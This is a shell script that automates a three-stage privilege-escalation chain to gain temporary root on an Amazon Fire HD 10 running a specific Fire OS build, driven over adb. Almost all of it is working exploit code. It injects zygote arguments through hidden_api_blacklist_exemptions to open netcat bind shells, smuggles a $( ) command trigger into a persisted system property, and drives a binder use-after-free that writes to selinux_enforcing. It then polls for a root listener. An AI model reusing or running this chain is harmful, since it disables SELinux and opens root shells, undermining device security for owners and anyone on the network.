#!/usr/bin/env zsh
# root-firehd10.sh — automated temporary-root chain for Amazon Fire HD 10 (2021, "trona"/KFTRWI)
# on Fire OS 7.3.2.9 (build PS7329.3842N). Drives the voidnullvalue/SnuSnuRoot exploit chain:
#   P1 CVE-2024-31317 (zygote injection, uid-1000 channel)
#   P2 CVE-2019-2181  (binder UAF: stateful leak + NULL write to selinux_enforcing)
#   P3 Amazon time_update persisted-property injection (boot-time uid-0 waiter)
#
# IMPORTANT: the P2b write target (SELINUX_ENFORCING_ADDRESS inside the deployed
# SnuSnuRoot carrier .so) is BUILD-SPECIFIC. For PS7329.3842N it must be
# 0xffffff800996d668 — see docs/ADDRESS-TABLE.md in this repo. Verify the deployed
# libhwbinder_target.arm64-v8a.so carries the address for YOUR build before running.
#
# Credits and provenance: see CREDITS.md. Usage: ./root-firehd10.sh [max-attempts]
# Security note: Wi-Fi adb (port 5555) makes the tablet reachable from any device on the LAN.
# Disable it when done: adb usb (from USB) or reboot.
# Note: PAYLOAD variable defaults to the rootsvc_payload_root.sh script committed alongside this script.
set -u
WSL_ADB="${ADB:-$(command -v adb)}"
WIN_ADB="${WIN_ADB:-/mnt/c/adb/adb.exe}"   # only needed if TCP adb must be re-armed after reboots
if [ -z "$TAB" ]; then
  echo "set TAB=<tablet-ip>:5555 — find the IP in Settings > Wi-Fi, or: adb shell ip addr show wlan0" >&2
  exit 1
fi
if [ -z "$ADB" ] && ! command -v adb >/dev/null; then
  echo "ADB not set and no 'adb' on PATH; install platform-tools or set ADB=/path/to/adb" >&2
  exit 1
fi
PAYLOAD="${PAYLOAD:-$(dirname "$0")/rootsvc_payload_root.sh}"
TRIGGER='x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'
OLD_TIME_FILE=/data/local/tmp/__reroot_old_time
MAX=${1:-5}
LOG="$(dirname "$0")/root-run.log"   # note: evidence/root-run-campaign.log is the archived campaign log (different tool)
: > "$LOG"
say() { echo "[root $(date +%H:%M:%S)] $*" | tee -a "$LOG"; }

wait_boot() {
  for i in $(seq 1 60); do
    bc=$($WSL_ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
    [ "$bc" = "1" ] && return 0
    sleep 3
  done
  return 1
}

reconnect() {
  $WSL_ADB disconnect "$TAB" >/dev/null 2>&1
  for i in $(seq 1 40); do
    $WSL_ADB connect "$TAB" >/dev/null 2>&1
    n=$($WSL_ADB devices 2>/dev/null | tr -d '\r' | grep -c "$TAB.device")
    [ "$n" = "1" ] && return 0
    [ -x "$WIN_ADB" ] && "$WIN_ADB" tcpip 5555 >/dev/null 2>&1
    sleep 5
  done
  return 1
}

spawn_uid1000_channel() {
  # P1: CVE-2024-31317. Requires inject.txt staged at /data/local/tmp/inject.txt
  # (the upstream SnuSnuRoot zygote payload; see README §3).
  $WSL_ADB shell 'V=$(cat /data/local/tmp/inject.txt); settings put global hidden_api_blacklist_exemptions "$V"; settings delete global hidden_api_blacklist_exemptions' >/dev/null 2>&1
  sleep 3
  printf 'id\nexit\n' | timeout 10 $WSL_ADB shell "toybox nc -w 5 127.0.0.1 4321" 2>/dev/null | tr -d '\r' | head -1
}

arm_trigger() {
  # P3 arm: the trigger contains $( ) — it MUST reach the property as a literal or
  # the nc shell will evaluate it as uid 1000 (the payload then runs without root).
  # Base64 the trigger and decode it INSIDE the device shell (upstream method,
  # SnuSnuRoot/scripts/stage_reroot_waiter.sh).
  local TB64; TB64=$(printf '%s' "$TRIGGER" | base64 | tr -d '\n')
  printf 'setprop persist.sys.saved_time "$(printf %%s %s | toybox base64 -d)"\nexit\n' "$TB64" \
    | timeout 20 $WSL_ADB shell "toybox nc -w 15 127.0.0.1 4321" >/dev/null 2>&1
  local armed; armed=$($WSL_ADB shell getprop persist.sys.saved_time 2>/dev/null | tr -d '\r')
  [ "$armed" = "$TRIGGER" ]
}

spawn_carrier() {
  # P2 carrier: app_process64 + the SnuSnuRoot agent.jar/JNI libs, staged by the
  # upstream stage_initial_root_assets.sh into /data/securedStorageLocation/codex.amazon.jni.v51
  $WSL_ADB shell "settings put global hidden_api_blacklist_exemptions 'LClass1;->method1(
10
--runtime-args
--setuid=10100
--setgid=10100
--runtime-flags=2049
--mount-external-full
--setgroups=3003
--nice-name=codex-system-amazon-v52
--seinfo=amazonapp:targetSdkVersion=22:complete
--invoke-with
/system/bin/sh /data/securedStorageLocation/codex.amazon.jni.v51/carrier_launcher.sh;
'
settings delete global hidden_api_blacklist_exemptions" >/dev/null 2>&1
  for i in $(seq 1 20); do
    pong=$(printf 'PING\n' | timeout 8 $WSL_ADB shell "toybox nc -w 3 127.0.0.1 43271" 2>/dev/null | tr -d '\r')
    [ "$pong" = "PONG" ] && return 0
    sleep 1
  done
  return 1
}

preflight() {
  # Check adb binary missing
  if [ ! -x "$WSL_ADB" ]; then
    echo "adb binary missing or not executable: $WSL_ADB" >&2
    exit 1
  fi

  # Check device unreachable
  if ! $WSL_ADB shell getprop sys.boot_completed 2>/dev/null | grep -q '1'; then
    echo "device unreachable or boot not completed" >&2
    exit 1
  fi

  # Check staged carrier dir
  if ! $WSL_ADB shell test -d /data/securedStorageLocation/codex.amazon.jni.v51 2>/dev/null; then
    echo "staged carrier dir not found: /data/securedStorageLocation/codex.amazon.jni.v51" >&2
    exit 1
  fi

  # Check the deployed carrier .so matches the expected sha256. We cannot
  # grep the binary for the SELINUX_ENFORCING address string because the
  # address is compiled into movz/movk instruction immediates, not stored
  # as ASCII. The default hash is the verified PS7329 build (see
  # evidence/deployed-so-sha256.txt). If you rebuilt the .so for a
  # different build, set EXPECTED_SO_SHA256 to your build's hash.
  # (EXPECTED_SELINUX_ADDR is retained as informational only — it is no
  # longer used to verify the .so.)
  local so_path="/data/securedStorageLocation/codex.amazon.jni.v51/libhwbinder_target.arm64-v8a.so"
  local temp_so
  temp_so=$(mktemp) || { echo "failed to create temp file" >&2; exit 1; }
  if ! $WSL_ADB pull "$so_path" "$temp_so" 2>/dev/null; then
    echo "failed to pull $so_path" >&2
    rm -f "$temp_so"
    exit 1
  fi
  if [ ! -s "$temp_so" ]; then
    echo "pulled $so_path is empty" >&2
    rm -f "$temp_so"
    exit 1
  fi
  local expected_sha="${EXPECTED_SO_SHA256:-a6008a8449e306d7de3dacf29078d2a2a2c3fd7ab6983182c9cb3192ecd25f7c}"
  local actual_sha
  actual_sha=$(sha256sum "$temp_so" 2>/dev/null | awk '{print $1}')
  rm -f "$temp_so"
  if [ "$actual_sha" != "$expected_sha" ]; then
    echo "libhwbinder_target.arm64-v8a.so sha256 mismatch:" >&2
    echo "  expected: $expected_sha" >&2
    echo "  actual:   $actual_sha" >&2
    echo "  if you rebuilt the .so, set EXPECTED_SO_SHA256 to your build's hash" >&2
    exit 1
  fi
}

stage_inject() {
  local inject_file
  inject_file=$(mktemp) || { echo "failed to create temp file" >&2; return 1; }
  cat > "$inject_file" <<'EOF'
LClass1;->method1(
10
--runtime-args
--setuid=1000
--setgid=1000
--runtime-flags=2049
--mount-external-full
--setgroups=3003
--nice-name=runnetcat
--seinfo=platform:targetSdkVersion=28:complete
--invoke-with
toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;
EOF
  $WSL_ADB push "$inject_file" /data/local/tmp/inject.txt >/dev/null 2>&1
  local ret=$?
  rm -f "$inject_file"
  if [ $ret -ne 0 ]; then
    echo "failed to push inject.txt" >&2
    return 1
  fi
  if ! $WSL_ADB shell test -f /data/local/tmp/inject.txt 2>/dev/null; then
    echo "failed to verify /data/local/tmp/inject.txt on device" >&2
    return 1
  fi
}

preflight || { echo "preflight failed — see messages above" >&2; exit 1; }
attempt=1
while [ $attempt -le $MAX ]; do
  say "=== attempt $attempt/$MAX ==="
  say "staging waiter (consumes this boot's P1 one-shot)"
  oldt=$($WSL_ADB shell getprop persist.sys.saved_time 2>/dev/null | tr -d '\r')
  echo "$oldt" | $WSL_ADB shell "cat > $OLD_TIME_FILE" >/dev/null 2>&1
  cat "$PAYLOAD" | $WSL_ADB shell "cat > /data/local/tmp/__reroot_payload.sh; chmod 0755 /data/local/tmp/__reroot_payload.sh" >/dev/null 2>&1
  stage_inject || { say "failed to stage inject.txt"; exit 1; }

  # spawn the uid-1000 channel with retries: the injection needs the WebView zygote alive
  armed=""
  for ch in 1 2 3 4 5; do
    spawn_uid1000_channel >/dev/null 2>&1
    sleep 2
    arm_trigger
    armed=$($WSL_ADB shell getprop persist.sys.saved_time 2>/dev/null | tr -d '\r')
    if [ "$armed" = "$TRIGGER" ]; then
      say "armed on channel attempt $ch — rebooting IMMEDIATELY (the P3 fuse fires 30s after parse; it must not fire on this staging boot)"
      $WSL_ADB reboot >/dev/null 2>&1
      break
    fi
    say "channel attempt $ch failed (armed=$armed)"
  done
  [ "$armed" = "$TRIGGER" ] || say "WARN: trigger not armed after 5 channel attempts — rebooting anyway"

  sleep 40
  reconnect || { say "FATAL: cannot reconnect after reboot"; exit 1 }
  wait_boot || { say "FATAL: boot never completed"; exit 1 }
  sleep 8
  # wake the WebView zygote: the P1 injection needs it alive
  $WSL_ADB shell "monkey -p com.amazon.h2settingsfortablet -c android.intent.category.LAUNCHER 1" >/dev/null 2>&1
  sleep 5
  say "boot ok; spawning carrier"
  if ! spawn_carrier; then
    say "carrier spawn failed; next attempt"
    attempt=$((attempt+1)); continue
  fi
  say "carrier PONG; leak"
  leak=$(printf 'HWBINDER_STATEFUL\n' | timeout 20 $WSL_ADB shell "toybox nc -w 8 127.0.0.1 43271" 2>/dev/null | tr -d '\r')
  say "leak: $leak"
  case "$leak" in
    *result=0x5000000000000000*)
      if [ -n "$DRY_RUN" ]; then
        say "[DRY_RUN] would run HWBINDER_STATEFUL_WRITE now"
        exit 0
      fi
      say "LEAK CONFIRMED — running write"
      w=$(printf 'HWBINDER_STATEFUL_WRITE\n' | timeout 20 $WSL_ADB shell "toybox nc -w 8 127.0.0.1 43271" 2>/dev/null | tr -d '\r')
      say "write: $w"
      sleep 2
      en=$($WSL_ADB shell getenforce 2>/dev/null | tr -d '\r')
      say "getenforce=$en"
      # the P3 waiter (fired as root at boot) observes Permissive and launches the
      # uid-0 listener; poll up to 60s for it
      probe=""
      for i in $(seq 1 20); do
        probe=$(printf 'id -u\nexit\n' | timeout 10 $WSL_ADB shell "toybox nc -w 3 127.0.0.1 4325" 2>/dev/null | tr -d '\r' | head -1)
        [ -n "$probe" ] && break
        sleep 3
      done
      say "root_probe_4325=$probe"
      if [ "$probe" = "0" ]; then
        echo "ROOT_WIN attempt=$attempt $(date)" >> "$LOG"
        say "*** ROOT: uid-0 listener live on 127.0.0.1:4325 ***"
        exit 0
      fi
      ;;
  esac
  attempt=$((attempt+1))
done
say "EXHAUSTED $MAX attempts"
exit 3